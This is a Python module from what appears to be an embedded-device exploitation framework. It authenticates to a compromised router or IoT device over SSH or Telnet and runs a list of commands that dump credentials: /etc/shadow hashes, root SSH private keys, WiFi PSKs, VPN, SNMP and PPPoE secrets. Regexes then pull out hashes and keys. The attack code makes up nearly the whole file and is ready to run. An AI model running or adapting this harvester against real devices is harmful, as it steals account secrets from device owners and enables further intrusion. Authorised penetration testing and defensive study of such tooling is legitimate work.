# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""Post-compromise credential extraction from embedded devices via SSH/Telnet.

Connects to a compromised embedded device (router, IoT gateway, access point)
and extracts credentials from common filesystem locations: /etc/passwd,
/etc/shadow, nvram configuration, UCI config, temporary config files, SSH keys,
WiFi tokens, and SNMP community strings.

Supports SSH and Telnet protocols for remote command execution on the target.

MITRE ATT&CK: T1003 (Credential Dumping), T1552 (Unsecured Credentials)
References:
  - https://attack.mitre.org/techniques/T1003/
  - https://attack.mitre.org/techniques/T1552/

Version: 1.0.0
"""
from __future__ import annotations

import re
import socket
import time
from typing import Dict, List, Optional, Tuple

from embedxpl.core.exploit import (
    Exploit as BaseExploit,
    OptIP,
    OptPort,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_table,
    print_warning,
)
# Credential extraction commands grouped by category
_CREDENTIAL_COMMANDS: List[Tuple[str, str]] = [
    # System accounts
    ("cat /etc/passwd 2>/dev/null", "passwd"),
    ("cat /etc/shadow 2>/dev/null", "shadow"),
    # NVRAM credentials (Broadcom-based routers, DD-WRT, Tomato)
    ("nvram show 2>/dev/null | grep -iE 'passw|secret|key|login|user|psk|wpa|wep|community'", "nvram"),
    # UCI configuration (OpenWrt, LEDE)
    ("uci show wireless 2>/dev/null", "uci_wireless"),
    ("uci show network 2>/dev/null", "uci_network"),
    ("uci show uhttpd 2>/dev/null", "uci_uhttpd"),
    ("uci show dropbear 2>/dev/null", "uci_dropbear"),
    # Temporary config files
    ("cat /tmp/*.conf 2>/dev/null", "tmp_conf"),
    ("cat /tmp/*.cfg 2>/dev/null", "tmp_cfg"),
    ("cat /var/run/*.conf 2>/dev/null", "var_run_conf"),
    # SSH keys
    ("cat /etc/dropbear/dropbear_rsa_host_key 2>/dev/null | xxd | head -5", "dropbear_key"),
    ("cat /root/.ssh/authorized_keys 2>/dev/null", "ssh_authorized"),
    ("cat /root/.ssh/id_rsa 2>/dev/null", "ssh_privkey"),
    ("ls -la /etc/dropbear/ 2>/dev/null", "dropbear_dir"),
    # WiFi credentials
    ("cat /etc/config/wireless 2>/dev/null", "wireless_config"),
    ("iwconfig 2>/dev/null", "iwconfig"),
    ("cat /etc/hostapd.conf 2>/dev/null", "hostapd"),
    ("cat /etc/wpa_supplicant.conf 2>/dev/null", "wpa_supplicant"),
    # SNMP community strings
    ("cat /etc/snmp/snmpd.conf 2>/dev/null | grep -i community", "snmp_community"),
    ("cat /etc/config/snmpd 2>/dev/null", "snmpd_config"),
    # VPN credentials
    ("cat /etc/openvpn/*.conf 2>/dev/null", "openvpn"),
    ("cat /etc/ipsec.secrets 2>/dev/null", "ipsec_secrets"),
    # Web interface credentials
    ("cat /etc/lighttpd/lighttpd.conf 2>/dev/null | grep -i pass", "lighttpd"),
    ("cat /etc/httpd.conf 2>/dev/null | grep -i pass", "httpd"),
    # PPPoE credentials
    ("cat /etc/ppp/chap-secrets 2>/dev/null", "ppp_chap"),
    ("cat /etc/ppp/pap-secrets 2>/dev/null", "ppp_pap"),
]

# Patterns that indicate credentials in output
_CREDENTIAL_PATTERNS = [
    re.compile(r"(?:pass(?:w(?:or)?d)?|psk|key|secret|community|token)\s*[=:]\s*(.+)", re.IGNORECASE),
    re.compile(r"(\$[156]\$[^\s:]+)", re.IGNORECASE),  # crypt hashes
    re.compile(r"(-----BEGIN (?:RSA |DSA |EC )?PRIVATE KEY-----)", re.IGNORECASE),
]
class Exploit(BaseExploit):
    """Embedded Device Credential Harvester.

    Post-compromise module that extracts credentials from embedded/IoT devices
    via SSH or Telnet sessions. Targets passwd/shadow files, NVRAM config,
    UCI settings, WiFi PSKs, SSH keys, SNMP communities, and VPN secrets.

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Embedded Device Credential Harvester",
        "description": (
            "Post-compromise credential extraction from embedded devices. "
            "Connects via SSH or Telnet and extracts credentials from passwd, shadow, "
            "nvram, UCI config, WiFi PSKs, SSH keys, SNMP communities, and VPN secrets. "
            "MITRE: T1003, T1552."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://attack.mitre.org/techniques/T1003/",
            "https://attack.mitre.org/techniques/T1552/",
            "https://openwrt.org/docs/guide-user/base-system/uci",
        ),
        "devices": (
            "OpenWrt routers",
            "DD-WRT routers",
            "Tomato firmware devices",
            "BusyBox-based embedded Linux",
            "Generic IoT gateways",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(22, "Target SSH or Telnet port")
    username = OptString("root", "Authentication username")
    password = OptString("", "Authentication password")
    protocol = OptString("ssh", "Connection protocol: ssh or telnet")

    def run(self) -> None:
        """Execute credential harvesting against the target device."""
        proto = str(self.protocol).lower().strip()
        if proto not in ("ssh", "telnet"):
            print_error("Invalid protocol '{}'. Use 'ssh' or 'telnet'.".format(proto))
            return

        print_status("Credential harvest starting on {}:{} via {}".format(
            self.target, self.port, proto,
        ))

        sock = self._connect()
        if sock is None:
            print_error("Failed to connect to {}:{}".format(self.target, self.port))
            return

        try:
            if proto == "telnet":
                if not self._telnet_authenticate(sock):
                    print_error("Telnet authentication failed.")
                    return
            else:
                if not self._ssh_authenticate(sock):
                    print_error("SSH authentication failed.")
                    return

            print_success("Authenticated to {}:{} as '{}'".format(
                self.target, self.port, self.username,
            ))

            all_findings: List[Tuple[str, str, str]] = []

            for cmd, label in _CREDENTIAL_COMMANDS:
                print_info("Extracting: {}".format(label))
                output = self._exec_command(sock, cmd, proto)
                if output and output.strip():
                    creds = self._parse_credentials(output, label)
                    if creds:
                        all_findings.extend(creds)
                    else:
                        # Store raw output when no pattern match but data present
                        all_findings.append((label, "(raw data)", output.strip()[:200]))

            if all_findings:
                print_success("Extracted {} credential items from {}".format(
                    len(all_findings), self.target,
                ))
                print_table(
                    ("Source", "Type", "Value"),
                    *[(src, typ, val[:80]) for src, typ, val in all_findings],
                )
            else:
                print_warning("No credentials found on {}".format(self.target))

        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _connect(self) -> Optional[socket.socket]:
        """Establish TCP connection to the target."""
        try:
            sock = socket.create_connection(
                (str(self.target), int(self.port)),
                timeout=10,
            )
            sock.settimeout(8)
            return sock
        except (OSError, socket.error) as exc:
            print_error("Connection error: {}".format(exc))
            return None

    def _recv_until(self, sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
        """Receive data until a marker byte sequence appears or timeout."""
        data = b""
        end_time = time.monotonic() + timeout
        while time.monotonic() < end_time:
            remaining = end_time - time.monotonic()
            if remaining <= 0:
                break
            sock.settimeout(min(remaining, 2.0))
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if marker in data:
                    break
            except socket.timeout:
                break
            except OSError:
                break
        return data

    def _telnet_authenticate(self, sock: socket.socket) -> bool:
        """Perform Telnet authentication handshake."""
        # Consume Telnet negotiation and wait for login prompt
        banner = self._recv_until(sock, b"ogin:", timeout=8)

        # Handle Telnet IAC negotiation bytes
        clean_banner = banner.replace(b"\xff", b"")
        if b"ogin:" not in clean_banner and b"sername:" not in clean_banner:
            # Try sending a newline to trigger prompt
            sock.sendall(b"\r\n")
            banner = self._recv_until(sock, b"ogin:", timeout=5)

        # Send username
        sock.sendall(str(self.username).encode() + b"\r\n")

        # Wait for password prompt
        pwd_prompt = self._recv_until(sock, b"assword:", timeout=5)
        if b"assword:" in pwd_prompt or b"asscode:" in pwd_prompt:
            sock.sendall(str(self.password).encode() + b"\r\n")

        # Check authentication result
        result = self._recv_until(sock, b"#", timeout=5)
        if b"#" in result or b"$" in result or b">" in result:
            return True

        if b"incorrect" in result.lower() or b"denied" in result.lower():
            return False

        # Some devices land directly on shell
        sock.sendall(b"id\r\n")
        id_result = self._recv_until(sock, b"\n", timeout=3)
        return b"uid=" in id_result

    def _ssh_authenticate(self, sock: socket.socket) -> bool:
        """Perform basic SSH authentication via raw socket protocol.

        Implements a minimal SSH transport to send password authentication.
        For production use, a library like paramiko is recommended; this
        approach covers basic embedded SSH daemons (Dropbear).
        """
        # Read server banner
        banner = self._recv_until(sock, b"\n", timeout=5)
        if not banner or b"SSH-" not in banner:
            print_error("Target does not appear to be an SSH server.")
            return False

        # Send client banner
        sock.sendall(b"SSH-2.0-EmbedXPL_1.0\r\n")

        # For raw socket SSH, full key exchange is complex; we fall back
        # to executing the ssh command via subprocess if available.
        # If that fails, we attempt a Telnet-style interactive session
        # (some embedded Dropbear servers allow this on non-standard ports).
        import subprocess

        try:
            result = subprocess.run(
                [
                    "ssh",
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "UserKnownHostsFile=/dev/null",
                    "-o", "ConnectTimeout=10",
                    "-o", "BatchMode=yes",
                    "-p", str(self.port),
                    "{}@{}".format(self.username, self.target),
                    "echo XPL_AUTH_OK",
                ],
                capture_output=True,
                text=True,
                timeout=15,
                env={"SSHPASS": str(self.password), "PATH": "/usr/bin:/bin:/usr/local/bin"},
            )
            if "XPL_AUTH_OK" in result.stdout:
                # Close the raw socket; we will use subprocess for commands
                sock.close()
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            pass

        # Try sshpass if available
        try:
            result = subprocess.run(
                [
                    "sshpass", "-p", str(self.password),
                    "ssh",
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "UserKnownHostsFile=/dev/null",
                    "-o", "ConnectTimeout=10",
                    "-p", str(self.port),
                    "{}@{}".format(self.username, self.target),
                    "echo XPL_AUTH_OK",
                ],
                capture_output=True,
                text=True,
                timeout=15,
            )
            if "XPL_AUTH_OK" in result.stdout:
                sock.close()
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            pass

        print_warning("SSH key-exchange requires openssh client or sshpass on this host.")
        return False

    def _exec_command(self, sock: socket.socket, cmd: str, proto: str) -> str:
        """Execute a command on the remote device and return output."""
        if proto == "telnet":
            return self._exec_telnet(sock, cmd)
        return self._exec_ssh(cmd)

    def _exec_telnet(self, sock: socket.socket, cmd: str) -> str:
        """Execute a command over the Telnet session."""
        try:
            # Clear any pending data
            sock.settimeout(0.5)
            try:
                sock.recv(4096)
            except socket.timeout:
                pass

            sock.sendall(cmd.encode() + b"\r\n")
            time.sleep(0.3)

            output = self._recv_until(sock, b"#", timeout=5)
            decoded = output.decode("utf-8", errors="replace")

            # Strip the echoed command and trailing prompt
            lines = decoded.splitlines()
            if lines and cmd in lines[0]:
                lines = lines[1:]
            if lines and (lines[-1].endswith("#") or lines[-1].endswith("$")):
                lines = lines[:-1]

            return "\n".join(lines)
        except (OSError, socket.error):
            return ""

    def _exec_ssh(self, cmd: str) -> str:
        """Execute a command via SSH subprocess."""
        import subprocess

        ssh_cmd = [
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=10",
            "-p", str(self.port),
            "{}@{}".format(self.username, self.target),
            cmd,
        ]

        # Try with sshpass first
        try:
            result = subprocess.run(
                ["sshpass", "-p", str(self.password)] + ssh_cmd,
                capture_output=True,
                text=True,
                timeout=15,
            )
            if result.returncode == 0:
                return result.stdout
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            pass

        # Fall back to plain ssh (key-based auth or agent)
        try:
            result = subprocess.run(
                ssh_cmd,
                capture_output=True,
                text=True,
                timeout=15,
                env={"PATH": "/usr/bin:/bin:/usr/local/bin"},
            )
            return result.stdout
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            return ""

    def _parse_credentials(self, output: str, source: str) -> List[Tuple[str, str, str]]:
        """Parse credential-like data from command output.

        Returns list of (source, type, value) tuples.
        """
        findings: List[Tuple[str, str, str]] = []

        for line in output.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            # Shadow file entries with hashes
            if source == "shadow" and ":" in line:
                parts = line.split(":")
                if len(parts) >= 2 and parts[1] and parts[1] not in ("*", "!", "x", "!!"):
                    findings.append((source, "password_hash", "{}:{}".format(parts[0], parts[1])))
                continue

            # Passwd entries with shells
            if source == "passwd" and ":" in line:
                parts = line.split(":")
                if len(parts) >= 7:
                    shell = parts[6]
                    if shell and shell not in ("/bin/false", "/usr/sbin/nologin", "/sbin/nologin"):
                        findings.append((source, "login_account", "{}:uid={}:{}".format(
                            parts[0], parts[2], shell,
                        )))
                continue

            # Pattern-based extraction
            for pattern in _CREDENTIAL_PATTERNS:
                match = pattern.search(line)
                if match:
                    value = match.group(1).strip() if match.lastindex else match.group(0).strip()
                    if value and len(value) > 1:
                        findings.append((source, "credential", value[:200]))
                    break

        return findings

    def check(self) -> bool:
        """Check if target port is open."""
        try:
            sock = socket.create_connection(
                (str(self.target), int(self.port)),
                timeout=5,
            )
            sock.close()
            return True
        except (OSError, socket.error):
            return False
